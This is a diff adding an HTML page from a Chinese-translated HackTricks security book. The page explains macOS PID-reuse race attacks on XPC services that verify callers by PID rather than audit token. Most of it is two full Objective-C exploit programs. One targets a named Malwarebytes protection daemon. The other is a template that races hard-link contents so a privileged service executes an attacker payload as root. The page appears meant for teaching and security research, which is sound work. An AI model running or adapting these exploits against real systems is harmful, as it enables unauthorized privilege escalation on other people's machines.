@@ -1,0 +1,502 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS PID Reuse</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-pid-重用"><a class="header" href="#macos-pid-重用">macOS PID 重用</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="pid-重用"><a class="header" href="#pid-重用">PID 重用</a></h2>
+<p>当 macOS <strong>XPC 服务</strong> 基于 <strong>PID</strong> 而不是 <strong>审计令牌</strong> 检查被调用的进程时，它就容易受到 PID 重用攻击。该攻击基于 <strong>竞争条件</strong>，其中 <strong>利用</strong> 将 <strong>消息发送到 XPC</strong> 服务 <strong>滥用</strong> 功能，随后执行 <strong><code>posix_spawn(NULL, target_binary, NULL, &amp;attr, target_argv, environ)</code></strong> 使用 <strong>允许的</strong> 二进制文件。</p>
+<p>此函数将使 <strong>允许的二进制文件拥有 PID</strong>，但 <strong>恶意的 XPC 消息会在此之前发送</strong>。因此，如果 <strong>XPC</strong> 服务 <strong>使用</strong> <strong>PID</strong> 来 <strong>验证</strong> 发送者，并在执行 <strong><code>posix_spawn</code></strong> 之后检查它，它将认为消息来自 <strong>授权</strong> 进程。</p>
+<h3 id="利用示例"><a class="header" href="#利用示例">利用示例</a></h3>
+<p>如果你发现函数 <strong><code>shouldAcceptNewConnection</code></strong> 或其调用的函数 <strong>调用</strong> <strong><code>processIdentifier</code></strong> 而不调用 <strong><code>auditToken</code></strong>，这很可能意味着它在 <strong>验证进程 PID</strong> 而不是审计令牌。<br />
+例如在这张图片中（取自参考）：</p>
+<figure><img src="../../../../../../.gitbook/assets/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>
+<p>查看这个示例利用（同样取自参考）以查看利用的两个部分：</p>
+<ul>
+<li>一个 <strong>生成多个分叉</strong></li>
+<li><strong>每个分叉</strong> 将 <strong>发送</strong> <strong>有效载荷</strong> 到 XPC 服务，同时在发送消息后立即执行 <strong><code>posix_spawn</code></strong>。</li>
+</ul>
+<p>{% hint style="danger" %}
+为了使利用有效，重要的是 <code>export`` ``</code><strong><code>OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES</code></strong> 或将其放入利用中：</p>
+<pre><code class="language-objectivec">asm(".section __DATA,__objc_fork_ok\n"
+"empty:\n"
+".no_dead_strip empty\n");
+</code></pre>
+<p>{% endhint %}</p>
+<p>{% tabs %}
+{% tab title="NSTasks" %}
+第一种选择是使用 <strong><code>NSTasks</code></strong> 和参数来启动子进程以利用 RC</p>
+<pre><code class="language-objectivec">// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
+// gcc -framework Foundation expl.m -o expl
+
+#import &lt;Foundation/Foundation.h&gt;
+#include &lt;spawn.h&gt;
+#include &lt;sys/stat.h&gt;
+
+#define RACE_COUNT 32
+#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
+#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"
+
+// allow fork() between exec()
+asm(".section __DATA,__objc_fork_ok\n"
+"empty:\n"
+".no_dead_strip empty\n");
+
+extern char **environ;
+
+// defining necessary protocols
+@protocol ProtectionService
+- (void)startDatabaseUpdate;
+- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
+- (void)uninstallProduct;
+- (void)installProductUpdate;
+- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
+- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
+- (void)triggerLicenseRelatedChecks;
+- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
+- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
+- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
+- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
+- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
+- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
+- (void)restartOS;
+- (void)resumeScanJob;
+- (void)pauseScanJob;
+- (void)stopScanJob;
+- (void)startScanJob;
+- (void)disposeOperationBy:(NSUUID *)arg1;
+- (void)subscribeTo:(long long)arg1;
+- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
+@end
+
+void child() {
+
+// send the XPC messages
+NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
+xpcConnection.remoteObjectInterface = remoteInterface;
+
+[xpcConnection resume];
+[xpcConnection.remoteObjectProxy restartOS];
+
+char target_binary[] = BINARY;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&amp;attr);
+short flags;
+posix_spawnattr_getflags(&amp;attr, &amp;flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&amp;attr, flags);
+posix_spawn(NULL, target_binary, NULL, &amp;attr, target_argv, environ);
+}
+
+bool create_nstasks() {
+
+NSString *exec = [[NSBundle mainBundle] executablePath];
+NSTask *processes[RACE_COUNT];
+
+for (int i = 0; i &lt; RACE_COUNT; i++) {
+processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
+}
+
+int i = 0;
+struct timespec ts = {
+.tv_sec = 0,
+.tv_nsec = 500 * 1000000,
+};
+
+nanosleep(&amp;ts, NULL);
+if (++i &gt; 4) {
+for (int i = 0; i &lt; RACE_COUNT; i++) {
+[processes[i] terminate];
+}
+return false;
+}
+
+return true;
+}
+
+int main(int argc, const char * argv[]) {
+
+if(argc &gt; 1) {
+// called from the NSTasks
+child();
+
+} else {
+NSLog(@"Starting the race");
+create_nstasks();
+}
+
+return 0;
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="fork" %}
+这个例子使用原始 <strong><code>fork</code></strong> 来启动 <strong>将利用 PID 竞争条件的子进程</strong>，然后通过硬链接利用 <strong>另一个竞争条件：</strong></p>
+<pre><code class="language-objectivec">// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
+// gcc -framework Foundation expl.m -o expl
+
+#include &lt;Foundation/Foundation.h&gt;
+#include &lt;spawn.h&gt;
+#include &lt;pthread.h&gt;
+
+// TODO: CHANGE PROTOCOL AND FUNCTIONS
+@protocol HelperProtocol
+- (void)DoSomething:(void (^)(_Bool))arg1;
+@end
+
+// Global flag to track exploitation status
+bool pwned = false;
+
+/**
+* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
+* XPC service verify the legit binary and then execute as root out payload.
+*/
+void *check_race(void *arg) {
+while(!pwned) {
+// Overwrite with contents of the legit binary
+system("cat ./legit_bin &gt; hard_link");
+usleep(50000);
+
+// Overwrite with contents of the payload to execute
+// TODO: COMPILE YOUR OWN PAYLOAD BIN
+system("cat ./payload &gt; hard_link");
+usleep(50000);
+}
+return NULL;
+}
+
+void child_xpc_pid_rc_abuse(){
+// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
+#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
+extern char **environ;
+
+// Connect with XPC service
+// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
+NSString*  service_name = @"com.example.Helper";
+NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
+// TODO: CNAGE THE PROTOCOL NAME
+NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
+[connection setRemoteObjectInterface:interface];
+[connection resume];
+
+id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
+NSLog(@"[-] Something went wrong");
+NSLog(@"[-] Error: %@", error);
+}];
+
+NSLog(@"obj: %@", obj);
+NSLog(@"conn: %@", connection);
+
+// Call vulenrable XPC function
+// TODO: CHANEG NAME OF FUNCTION TO CALL
+[obj DoSomething:^(_Bool b){
+NSLog(@"Response, %hdd", b);
+}];
+
+// Change current process to the legit binary suspended
+char target_binary[] = kValid;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&amp;attr);
+short flags;
+posix_spawnattr_getflags(&amp;attr, &amp;flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&amp;attr, flags);
+posix_spawn(NULL, target_binary, NULL, &amp;attr, target_argv, environ);
+}
+
+/**
+* Function to perform the PID race condition using children calling the XPC exploit.
+*/
+void xpc_pid_rc_abuse() {
+#define RACE_COUNT 1
+extern char **environ;
+int pids[RACE_COUNT];
+
+// Fork child processes to exploit
+for (int i = 0; i &lt; RACE_COUNT; i++) {
+int pid = fork();
+if (pid == 0) {  // If a child process
+child_xpc_pid_rc_abuse();
+}
+printf("forked %d\n", pid);
+pids[i] = pid;
+}
+
+// Wait for children to finish their tasks
+sleep(3);
+
+// Terminate child processes
+for (int i = 0; i &lt; RACE_COUNT; i++) {
+if (pids[i]) {
+kill(pids[i], 9);
+}
+}
+}
+
+int main(int argc, const char * argv[]) {
+// Create and set execution rights to 'hard_link' file
+system("touch hard_link");
+system("chmod +x hard_link");
+
+// Create thread to exploit sign verification RC
+pthread_t thread;
+pthread_create(&amp;thread, NULL, check_race, NULL);
+
+while(!pwned) {
+// Try creating 'download' directory, ignore errors
+system("mkdir download 2&gt;/dev/null");
+
+// Create a hardlink
+// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
+system("ln hard_link download/legit_bin");
+
+xpc_pid_rc_abuse();
+usleep(10000);
+
+// The payload will generate this file if exploitation is successfull
+if (access("/tmp/pwned", F_OK ) == 0) {
+pwned = true;
+}
+}
+
+return 0;
+}
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h2 id="其他示例"><a class="header" href="#其他示例">其他示例</a></h2>
+<ul>
+<li><a href="https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html">https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html</a></li>
+</ul>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/">https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/</a></li>
+<li><a href="https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf">https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-xpc_connection_get_audit_token-attack.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-xpc_connection_get_audit_token-attack.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../../../elasticlunr.min.js"></script>
+        <script src="../../../../../../mark.min.js"></script>
+        <script src="../../../../../../searcher.js"></script>
+
+        <script src="../../../../../../clipboard.min.js"></script>
+        <script src="../../../../../../highlight.js"></script>
+        <script src="../../../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
